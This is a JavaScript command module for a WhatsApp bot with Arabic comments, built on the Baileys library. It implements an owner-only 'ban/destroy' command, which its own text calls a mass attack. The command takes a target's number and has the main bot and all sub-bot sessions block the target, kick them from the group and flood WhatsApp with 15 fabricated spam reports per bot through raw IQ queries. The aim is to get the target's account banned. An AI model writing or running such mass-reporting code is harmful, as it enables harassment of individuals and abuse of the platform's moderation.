/**
 * @file src/commands/ban.js
 * @description أمر .تبنيد الشامل بالزخارف وقناة البوت ومقيد حصرياً لرقم المطور +380911818719
 */

import { generateMessageIDV2, jidNormalizedUser } from '@whiskeysockets/baileys';

const ALLOWED_DEVELOPER = '380911818719';

const CONFIG = Object.freeze({
    CHANNEL_ID: '120363427347904077@newsletter',
    BOT_NAME: '❄️ 𝑨𝑳𝑽𝑨𝑹𝑰𝑨 𝑩𝑶𝑻 ❄️',
    CONCURRENCY: 10,
    BOT_TIMEOUT_MS: 7000,
    REPORTS_COUNT: 15
});

const FOOTER = `*❃⋅━̊━̊━̊---━̊━̊━̊━̊❄️━̊━̊━̊━̊━̊━̊━̊⋅❃*\n\`❄️ 𝑨𝒍𝒗𝒂𝒓𝒊𝒂\``;

function appendFooter(text) {
    return `${text}\n\n${FOOTER}`;
}

const withTimeout = (promise, ms, label) => {
    let timeoutHandle;
    const timeoutPromise = new Promise((_, reject) => {
        timeoutHandle = setTimeout(() => reject(new Error(`انتهت المهلة (${label})`)), ms);
    });
    return Promise.race([
        promise.finally(() => clearTimeout(timeoutHandle)),
        timeoutPromise
    ]);
};

async function runPool(items, limit, worker) {
    const results = new Array(items.length);
    let next = 0;
    const runners = Array.from({ length: Math.min(limit, items.length) }, async () => {
        while (true) {
            const i = next++;
            if (i >= items.length) return;
            try {
                results[i] = await worker(items[i], i);
            } catch (err) {
                results[i] = { error: err };
            }
        }
    });
    await Promise.all(runners);
    return results;
}

const buildChannelContext = () => ({
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
        newsletterJid: CONFIG.CHANNEL_ID,
        newsletterName: CONFIG.BOT_NAME,
        serverMessageId: -1,
    },
});

async function sendSpamReport(sock, targetJid) {
    const cleanJid = jidNormalizedUser(targetJid);
    const userId = sock.user?.id || '';
    const iqId = (typeof generateMessageIDV2 === 'function' ? generateMessageIDV2(userId) : null) || `iq-ban-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;

    return await sock.query({
        tag: 'iq',
        attrs: {
            id: iqId,
            type: 'set',
            to: 's.whatsapp.net',
            xmlns: 'spam'
        },
        content: [
            {
                tag: 'spam_list',
                attrs: {
                    jid: cleanJid,
                    spam_flow: 'account_info_report'
                }
            }
        ]
    });
}

export default {
    name: 'تبنيد',
    command: ['تبنيد', 'بند', 'ban', 'destroy'],
    category: 'owner',
    ownerOnly: true,
    description: 'أمر الهجوم الجماعي والتبنيد الفوري (خاص بالمطور الأساسي)',

    async handler(ctx) {
        try {
            const { sock, message, args = [], jid, senderJid, subbotManager } = ctx;
            const startedAt = Date.now();
            const chatId = jid || message?.key?.remoteJid;
            if (!chatId || !message) return;

            // ─── التحقق الصارم حصرياً من رقم +380911818719 ───
            const rawSender = senderJid || message?.key?.participant || message?.key?.remoteJid || '';
            const senderNum = String(rawSender).replace(/[^0-9]/g, '');
            const isOwner = senderNum.includes(ALLOWED_DEVELOPER) || ALLOWED_DEVELOPER.includes(senderNum);

            if (!isOwner) {
                if (sock?.sendMessage) {
                    await sock.sendMessage(chatId, { react: { text: '⛔', key: message.key } }).catch(() => {});
                    await sock.sendMessage(chatId, {
                        text: appendFooter('┏━━━━━━━━━━━━━━━━━━━━━━┓\n❃ ⛔ *هــذا الــأمــر مــخــصــص لــلــمــطــور الــأســاســي فــقــط.*\n┗━━━━━━━━━━━━━━━━━━━━━━┛'),
                        contextInfo: buildChannelContext()
                    }, { quoted: message }).catch(() => {});
                }
                return;
            }

            const input = args.join(' ').trim();
            let targetJid = null;
            let phone = null;

            const msgContent = message.message;
            const contextInfo = 
                msgContent?.extendedTextMessage?.contextInfo || 
                msgContent?.imageMessage?.contextInfo || 
                msgContent?.videoMessage?.contextInfo || 
                msgContent?.documentMessage?.contextInfo ||
                msgContent?.contactMessage ||
                msgContent?.contactsArrayMessage;

            const quotedParticipant = contextInfo?.participant;
            const mentionedJid = contextInfo?.mentionedJid?.[0];
            
            let contactVcardPhone = null;
            if (msgContent?.contactMessage?.vcard) {
                const match = msgContent.contactMessage.vcard.match(/waid=(\d+)/) || msgContent.contactMessage.vcard.match(/TEL[;:](\+?\d+)/);
                if (match) contactVcardPhone = match[1];
            }

            if (quotedParticipant) {
                targetJid = jidNormalizedUser(quotedParticipant);
            } else if (mentionedJid) {
                targetJid = jidNormalizedUser(mentionedJid);
            } else if (contactVcardPhone) {
                let cleaned = contactVcardPhone.replace(/[^0-9]/g, '');
                targetJid = jidNormalizedUser(`${cleaned}@s.whatsapp.net`);
            } else if (input) {
                let cleaned = input.replace(/[^0-9]/g, '');
                if (cleaned.startsWith('00')) cleaned = cleaned.slice(2);
                if (cleaned.length >= 7 && cleaned.length <= 15) {
                    targetJid = jidNormalizedUser(`${cleaned}@s.whatsapp.net`);
                }
            }

            if (!targetJid) {
                if (sock?.sendMessage) {
                    await sock.sendMessage(chatId, { react: { text: '⚠️', key: message.key } }).catch(() => {});
                    await sock.sendMessage(chatId, {
                        text: appendFooter('⚠️ *الرجاء الرد على رسالة المخرب، أو كارد جهة الاتصال، أو كتابة رقمه.*\n_مثال:_ `.تبنيد 380911818719`'),
                        contextInfo: buildChannelContext()
                    }, { quoted: message }).catch(() => {});
                }
                return;
            }

            phone = targetJid.split('@')[0].split(':')[0];
            if (sock?.sendMessage) {
                await sock.sendMessage(chatId, { react: { text: '⚡', key: message.key } }).catch(() => {});
            }

            const bots = [];
            const seenSocks = new WeakSet();

            if (sock && sock.user && sock.ws) {
                bots.push({ id: sock.user.id || 'main-bot', label: 'الـرئـيـسـي', sock });
                seenSocks.add(sock);
            }

            if (subbotManager && typeof subbotManager.getActiveSessions === 'function') {
                try {
                    const activeSubs = subbotManager.getActiveSessions();
                    for (const sub of (activeSubs || [])) {
                        const subSock = sub.socket;
                        if (!subSock || !subSock.user || !subSock.ws || seenSocks.has(subSock)) continue;
                        seenSocks.add(subSock);
                        const subId = subSock.user.id || `sub-${Math.random()}`;
                        const ownerLabel = sub.phone ? `فـرعـي (${sub.phone})` : 'فـرعـي';
                        bots.push({ id: subId, label: ownerLabel, sock: subSock });
                    }
                } catch (e) {}
            }

            // الموجة الأولى: الحظر والطرد
            for (const bot of bots) {
                try { if (bot.sock?.updateBlockStatus) await bot.sock.updateBlockStatus(targetJid, 'block'); } catch {}
            }
            if (chatId.endsWith('@g.us')) {
                try { await sock.groupParticipantsUpdate(chatId, [targetJid], 'remove').catch(() => {}); } catch {}
            }

            // الموجة الثانية: إغراق البلاغات
            const tasks = [];
            for (const bot of bots) {
                for (let i = 1; i <= CONFIG.REPORTS_COUNT; i++) {
                    tasks.push({ bot, reportIndex: i });
                }
            }

            const botStats = new Map();
            bots.forEach(b => botStats.set(b.id, { label: b.label, success: 0, failed: 0 }));

            await runPool(tasks, CONFIG.CONCURRENCY, async (task) => {
                const { bot, reportIndex } = task;
                const stats = botStats.get(bot.id);
                try {
                    await withTimeout(sendSpamReport(bot.sock, targetJid), CONFIG.BOT_TIMEOUT_MS, `إبلاغ ${reportIndex}`);
                    stats.success++;
                } catch (err) {
                    stats.failed++;
                }
            });

            let totalSuccess = 0;
            let totalFailed = 0;
            const details = [];

            for (const [id, stats] of botStats.entities ? botStats.entities() : botStats.entries()) {
                totalSuccess += stats.success;
                totalFailed += stats.failed;
                details.push(`• ${stats.label}: نـجـح (${stats.success}/${CONFIG.REPORTS_COUNT}) 🚀`);
            }

            const seconds = ((Date.now() - startedAt) / 1000).toFixed(1);
            const totalReportsTarget = bots.length * CONFIG.REPORTS_COUNT;

            const successText = appendFooter(
                `*❄️ تـقـريـر هـجـوم الـتـبـنـيد الشامل ❄️*\n\n` +
                `• *الـهـدف المستهدف:* \`+${phone}\`\n` +
                `• *البوتات المشاركة:* \`${bots.length} (${totalReportsTarget} بلاغ)\`\n` +
                `• *حالة البلاغات:* \`نجح: ${totalSuccess} | فشل: ${totalFailed}\`\n` +
                `• *الحظر والعزل:* \`تم بنجاح وطرد الهدف\`\n` +
                `• *الوقت المستغرق:* \`${seconds} ثانية\`\n\n` +
                `📋 *التفاصيل:*\n${details.join('\n')}`
            );

            if (sock?.sendMessage) {
                await sock.sendMessage(chatId, { react: { text: '⚡', key: message.key } }).catch(() => {});
                await sock.sendMessage(chatId, {
                    text: successText,
                    contextInfo: buildChannelContext()
                }, { quoted: message }).catch(() => {});
            }
        } catch (err) {
            console.error('[تبنيد] خطأ:', err);
        }
    }
};
